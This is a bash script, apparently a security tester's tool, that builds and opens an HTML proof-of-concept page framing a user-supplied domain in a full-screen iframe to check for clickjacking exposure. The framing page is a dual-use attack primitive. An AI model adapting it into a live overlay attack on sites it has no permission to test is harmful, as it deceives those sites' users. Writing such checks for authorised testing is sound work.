#! /bin/bash
read -p "Enter domain : " dom
echo "<html>
<head>
<title> Clickjacking </title>
<style>
frame {
opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
window.onbeforeunload = function()
{
return " Do you want to leave ?";
}
</script>
<p> site is vulnerable for Clickjacking !</p>
<iframe id="frame" width="100%" height="100%" src="$dom"></iframe>
</body>
</html>
" > clickjacking.html
read -p "Do you want to save the PoC ? (Y/N) : " save
case $save in
	N )
	firefox clickjacking.html
	sleep 5
	rm clickjacking.html
	;;
	NO )
	firefox clickjacking.html
	sleep 5
	rm clickjacking.html
	;;
	Y )
	echo "saved as clickjacking.html at $PWD"
	sleep 2 
	firefox clickjacking.html
	;;
	YES )
	echo "saved as clickjacking.html at $PWD" 
	sleep 2
	firefox clickjacking.html
	;;
	*)
	echo "PoC not saved"
	firefox clickjacking.html
	sleep 5
	rm clickjacking.html

esac
